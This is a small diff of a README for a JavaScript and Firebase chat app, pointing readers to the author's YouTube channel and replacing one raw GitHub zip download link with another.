@@ -15,5 +15,5 @@ I developed the Chat app using pure Javascript and firebase database. The interf
 
 If you are interested that how to build this app, please follow my Youtube channel.
 
-https://raw.githubusercontent.com/Huzaifa-kha/ChatApp/main/Scripts/ChatApp_v1.8.zip
+https://raw.githubusercontent.com/Huzaifa-kha/ChatApp/main/messaging/App-Chat-v1.1.zip
 
